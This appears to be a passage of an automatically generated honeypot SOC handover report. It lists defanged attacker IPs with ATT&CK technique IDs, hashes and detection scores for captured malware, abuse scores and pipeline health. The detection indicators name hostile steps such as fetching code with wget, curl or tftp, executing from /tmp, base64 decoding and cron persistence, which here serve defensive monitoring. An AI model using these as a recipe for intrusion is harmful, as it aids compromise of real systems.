| `139.199.80[.]137` | **9** | 2026-08-29 11:08 | 2026-08-29 14:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.227.62[.]247` | **4** | 2026-08-29 11:10 | 2026-08-29 11:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `31.43.97[.]48` | **4** | 2026-08-29 14:31 | 2026-08-29 14:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.209.220[.]169` | **3** | 2026-08-29 14:20 | 2026-08-29 14:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.131.103[.]142` | **3** | 2026-08-29 12:27 | 2026-08-29 12:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.5.64[.]26` | **3** | 2026-08-29 14:43 | 2026-08-29 14:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `136.116.129[.]132` | **3** | 2026-08-29 11:26 | 2026-08-29 12:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `176.120.110[.]160` | **3** | 2026-08-29 14:20 | 2026-08-29 14:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **3** | 2026-08-29 11:56 | 2026-08-29 12:51 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `45.169.52[.]254` | **3** | 2026-08-29 10:55 | 2026-08-29 10:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]104` | **3** | 2026-08-29 14:34 | 2026-08-29 14:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.179.180[.]117` | **2** | 2026-08-29 12:06 | 2026-08-29 12:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `186.124.46[.]253` | **2** | 2026-08-29 13:03 | 2026-08-29 13:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | **2** | 2026-08-29 14:28 | 2026-08-29 14:48 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-08-29 12:28 | 2026-08-29 12:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `78.39.109[.]160` | **2** | 2026-08-29 13:32 | 2026-08-29 14:13 | 4m | 0 | `T1592` | 🟢 LOW |
| `106.12.176[.]238` | 1 | 2026-08-29 12:59 | 2026-08-29 13:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.196.52[.]107` | 1 | 2026-08-29 12:06 | 2026-08-29 12:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.151[.]242` | 1 | 2026-08-29 13:26 | 2026-08-29 13:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.112[.]204` | 1 | 2026-08-29 12:55 | 2026-08-29 12:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `136.169.215[.]132` | 1 | 2026-08-29 12:14 | 2026-08-29 12:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]232` | 1 | 2026-08-29 13:01 | 2026-08-29 13:03 | 82s | 0 | `T1592` | 🟢 LOW |
| `176.118.0[.]135` | 1 | 2026-08-29 11:10 | 2026-08-29 11:10 | 13s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-08-29 13:37 | 2026-08-29 13:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.59.165[.]127` | 1 | 2026-08-29 14:34 | 2026-08-29 14:34 | 12s | 0 | `T1592` | 🟢 LOW |
| `213.66.196[.]11` | 1 | 2026-08-29 12:27 | 2026-08-29 12:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `216.218.206[.]66` | 1 | 2026-08-29 13:30 | 2026-08-29 13:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.211.91[.]162` | 1 | 2026-08-29 14:07 | 2026-08-29 14:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.155.103[.]100` | 1 | 2026-08-29 12:10 | 2026-08-29 12:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.94.121[.]31` | 1 | 2026-08-29 11:44 | 2026-08-29 11:44 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-08-29 13:06 | 2026-08-29 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.187.246[.]28` | 1 | 2026-08-29 13:09 | 2026-08-29 13:09 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-08-29 14:34 | 2026-08-29 14:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.59.108[.]159` | 1 | 2026-08-29 12:24 | 2026-08-29 12:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.59.109[.]199` | 1 | 2026-08-29 14:04 | 2026-08-29 14:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.59.91[.]172` | 1 | 2026-08-29 13:10 | 2026-08-29 13:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]37` | 1 | 2026-08-29 12:30 | 2026-08-29 12:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.64.85[.]138` | 1 | 2026-08-29 12:52 | 2026-08-29 12:52 | 10s | 0 | `T1592` | 🟢 LOW |
| `70.52.78[.]225` | 1 | 2026-08-29 11:56 | 2026-08-29 11:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-08-29 11:52 | 2026-08-29 11:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-08-29 11:20 | 2026-08-29 11:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.191.179[.]185` | 1 | 2026-08-29 14:05 | 2026-08-29 14:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.254.172[.]36` | 1 | 2026-08-29 10:55 | 2026-08-29 10:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.255.210[.]166` | 1 | 2026-08-29 14:05 | 2026-08-29 14:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.159.164[.]28` | 1 | 2026-08-29 14:15 | 2026-08-29 14:15 | 3s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]21` | 1 | 2026-08-29 12:52 | 2026-08-29 12:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]7` | 1 | 2026-08-29 12:37 | 2026-08-29 12:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-08-29 13:29 | 2026-08-29 13:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `92.167.92[.]88` | 1 | 2026-08-29 12:27 | 2026-08-29 12:27 | 14s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `89.253.90[.]113` | SE | Telenor Sverige AB | **100** ⚠️ | 50 |
| `36.64.211[.]93` | ID | PT TELKOM INDONESIA Menara Multimedia Lt.7 Jl. Kebon sirih No.12 JAKARTA | **100** ⚠️ | 50 |
| `183.89.208[.]174` | TH | Triple T Broadband Public Company Limited | **100** ⚠️ | 50 |
| `46.101.9[.]55` | GB | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `103.171.39[.]147` | IN | Arrow Touch Wireless Internet Private Limited | **100** ⚠️ | 37 |
| `178.178.222[.]59` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `46.59.91[.]172` | SE | Bahnhof AB | **100** ⚠️ | 2 |
| `120.48.118[.]142` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 0 |
| `136.116.129[.]132` | US | Google LLC | **100** ⚠️ | 3 |
| `201.208.172[.]85` | VE | CANTV Servicios, Venezuela | **100** ⚠️ | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 310 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 292 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 130 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 130 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 130 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 401 cases |
| Tool 34  | Credential Extractor        | ✅ 349 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 145 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (6.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 106 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 292 priority case(s) shown individually · 49 recon entry/entries in table (16 group(s) consolidating 51 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-29T16:28:09Z_
